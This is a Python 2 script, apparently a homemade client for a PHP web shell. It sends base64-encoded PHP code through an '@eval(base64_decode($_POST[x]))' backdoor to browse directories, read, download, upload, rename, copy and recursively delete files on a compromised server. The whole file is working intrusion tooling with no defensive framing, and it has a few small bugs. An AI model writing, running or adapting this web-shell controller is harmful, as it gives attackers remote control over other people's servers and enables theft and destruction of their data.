#! /usr/bin/env python
#! -*-coding:utf-8 -*-
'''
    注意 路径必须用.replace('\\', '\\\\')转换线
'''

import os
import sys
import urllib
import urllib2
import requests
import base64
import re
from optparse import OptionParser

shell = 'http://localhost/code/code/test/x.php'

initcode = "@eval(base64_decode($_POST[x]));&x="

initpath = "E:\\wamp\\www\\code\\code\\test\\"

remotepath = "C:\\Users\\Root\\Desktop\\"
class FuckShell():
    def __init__(self):
        fi = FileManage()
        #fi.GetFilePath(initpath)
        fi.CopyFile(initpath + 'x.php', initpath + "tmp\\x.php")


class FileManage:

    #浏览文件目录
    def GetFilePath(self, path):
        self.phpcode = initcode
        filelist = re.compile(r'file:([\s\S]+?)\stime:([\s\S]+?)\ssize:(\d+?)\sperm:(\d{4})')
        code = '''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-|");
        ;$D=%s;$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}
        else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T="time:".@date("Y-m-d H:i:s",@filemtime($P));
        @$E="perm:".substr(base_convert(@fileperms($P),10,8),-4);$R=" ".$T." size:".@filesize($P)." ".$E."
        ";if(@is_dir($P))$M.="file:".$N."/".$R;else $L.="file:".$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();
        ''' % "'{0}'".format(path.replace("\\", "\\\\"))  #发送的php代码
        self.phpcode += "{0}".format(base64.b64encode(code))
        order = Spider.post(shell, self.phpcode)
        if order == '-|ERROR:// Path Not Found Or No Permission!|<-':
            print "Error: Path Not Found Or No Permission!"
            return False
        else:
            self.ShowRule(filelist.findall(order))


    #删除文件
    def DeleteFile(self, path):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|");;function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;
        if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);
        }if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m-close();@chmod($p,0777);
        return @rmdir($p);}$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
        if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};echo("|<-");die();
        '''
        self.phpcode = initcode
        self.phpcode += "{0}&{1}".format(base64.b64encode(code), urllib.urlencode({"z1":path}))
        Spider.post(shell, self.phpcode)
        self.GetFilePath(initpath)


    #上传文件
    def UploadFile(self, remotepath, localfile):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|");;$f=base64_decode($_POST["z1"]);$c=$_POST["z2"];$c=str_replace("\r","",$c);
        $c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));
        echo(@fwrite(fopen($f,"wb"),$buf)?"1":"0");;echo("|<-");die();
        '''
        #注意 远程和本地都需要指定到文件名
        self.phpcode = initcode
        self.phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(remotepath.replace("\\", "\\\\")))
        with open(localfile, 'rb') as file:
            data = file.read()
        filestream = ""
        for line in range(len(data)):
            filestream += "%02x" % ord(data[line])
        self.phpcode += "&z2={0}".format(filestream)
        Spider.post(shell, self.phpcode)
        self.GetFilePath(initpath)

    #重命名文件
    def RenameFile(self,oldname,newname):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|");;$m=get_magic_quotes_gpc();
        $src=m?stripslashes($_POST["z1"]):$_POST["z1"];
        $dst=m?stripslashes($_POST["z2"]):$_POST["z2"];
        echo(rename($src,$dst)?"1":"0");
        ;echo("|<-");die();
        '''
        self.phpcode = initcode
        self.phpcode += "{0}&{1}".format(base64.b64encode(code),
        urllib.urlencode({'z1':oldname.replace('\\', '\\\\'), 'z2':newname.replace('\\', '\\\\')}))
        Spider.post(shell, self.phpcode)
        self.GetFilePath(initpath)

    #读取文件
    def ReadFile(self, file):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|\r\n");;$F=base64_decode($_POST["z1"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));
        @fclose($P);;echo("\r\n|<-");die();
        '''
        self.phpcode = initcode
        self.phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(file.replace('\\', '\\\\')))
        data = Spider.post(shell, self.phpcode)
        print data

    #TODO 不能这么写 如果下载二进制文件怎么办
    #下载文件
    def DownloadFile(self, remotefile, localpath):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        $F=base64_decode($_POST["z1"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));
        @fclose($P);;die();
        '''
        self.phpcode = initcode
        self.phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(remotefile.replace('\\', '\\\\')))
        data = Spider.post(shell, self.phpcode)
        self.filesave(data, localpath)

    #编辑文件
    def EditFile(self,remotefile):
        self.DownloadFile(remotefile, remotepath + "tmp{0}{1}".format(os.sep, 'tmp.txt'))

    #移动文件
    def CopyFile(self, sourcepath, descpath):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-|");;
        $m=get_magic_quotes_gpc();$fc=$m?stripslashes($_POST["z1"]):$_POST["z1"];
        $fp=$m?stripslashes($_POST["z2"]):$_POST["z2"];function xcopy($src,$dest){if(is_file($src))
        {if(!copy($src,$dest))return false;else return true;}$m=@dir($src);if(!is_dir($dest))
        if(!@mkdir($dest))return false;while($f=$m->read()){$isrc=$src.chr(47).$f;$idest=$dest.chr(47).$f;
        if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46).chr(46))){if(!xcopy($isrc,$idest))return false;}
        else if(is_file($isrc)){if(!copy($isrc,$idest))return false;}}return true;}echo(xcopy($fc,$fp)?"1":"0");
        ;echo("|<-");die();
        '''
        self.phpcode = initcode
        self.phpcode += "{0}&{1}".format(base64.b64encode(code) ,urllib.urlencode({'z1':sourcepath.replace('\\', '\\\\'), 'z2': descpath.replace('\\', '\\\\')}))
        #print self.phpcode
        Spider.post(shell, self.phpcode)

    def ShowRule(self, list):
        string = "total: {0}\nperm\t\tsize\t\tdate\t\tfile\n".format(len(list))
        for line in list:
            string += "{0}".format(self.showrwx(line[3][1]) + self.showrwx(line[3][2]) + self.showrwx(line[3][3]))
            string += "\t{0}".format(line[2])
            string += "\t{0}".format(line[1])
            string += "\t{0}\n".format(line[0])
        print string

    def showrwx(self, num):
        permx = {1:'--x', 2:'-w-', 4:'r--', 7:"rwx"}
        if num in permx.keys():
            return permx[num]
        elif num == 3 :
            return "-wx"
        elif num == 5:
            return "r-x"
        elif num == 6:
            return "rw-"
        else:
            return "rwx"
        return string

    def filesave(self, data, name):
        with open(name, 'w') as file:
            file.write(data)


class Spider:

    @staticmethod
    def post(url, data):
        header = {'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;'
        ' rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14'}
        data = "w=%s" % data
        req = urllib2.Request(url, data=data)
        req.add_header('User-Agent', header)
        html = urllib2.urlopen(req)
        data = html.read()
        html.close()
        return data

    @staticmethod
    def get(url, data):
        html = requests.get(url)



if __name__ == '__main__':
    FuckShell()